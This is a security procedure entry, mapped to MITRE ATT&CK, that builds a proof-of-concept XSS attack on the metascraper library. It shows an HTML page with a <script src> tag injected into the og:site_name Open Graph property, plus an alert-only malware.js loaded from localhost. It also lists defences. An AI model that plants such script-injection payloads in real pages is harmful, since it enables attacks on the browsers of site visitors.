---
id: proc-create-og-xss
tags:
  - xss
  - open-graph
  - payload-creation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:16:20.523Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-Malicious-Open-Graph-HTML

## Summary

This procedure creates a malicious HTML page embedding an XSS payload in Open Graph meta properties, simulating an attacker-controlled website that metascraper will scrape without sanitization.

## Description

In the attack scenario, the attacker crafts an HTML file with benign Open Graph tags but injects a <script> tag into properties like og:site_name. A separate malware.js file hosts the payload. When metascraper extracts this, the raw HTML is returned, and if inserted into a web page, it executes in the browser. Prerequisites include a text editor; no special environment needed beyond basic file creation.

## Requirements

1. Text editor (e.g., VS Code, nano)
2. Local directory for files
3. Basic HTML knowledge

## Defense

Defensive measures and detection strategies:

- Sanitize all scraped metadata using libraries like DOMPurify before rendering
- Validate Open Graph content against whitelists during extraction
- Monitor for anomalous script tags in meta properties on hosted sites

## Objectives

1. Embed executable JavaScript in OG metadata
2. Prepare files for serving as a target URL
3. Ensure payload triggers alert for PoC validation

## Instructions

### Step 1: Create the Malicious HTML File

**Context**: Build article.html with the XSS payload in og:site_name and other benign OG properties.

No command needed; manually create the file:

```html
<!DOCTYPE html>
<html>
<head>
    <meta property="og:site_name" content='<script src="http://127.0.0.1:8080/malware.js"></script>'>
    <meta property="og:title" content="Benign Article">
    <meta property="og:description" content="This is a test article.">
</head>
<body>
    <h1>Test Article</h1>
</body>
</html>
```

> This embeds the script tag directly in the content attribute, which metascraper extracts unsanitized.

### Step 2: Create the Malware JavaScript File

**Context**: Define the payload in malware.js to demonstrate execution.

No command; create the file:

```javascript
alert('Uh oh, I am very bad malware!');
```

> Save as malware.js; this will load and run when the script src is triggered.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[open-graph]]
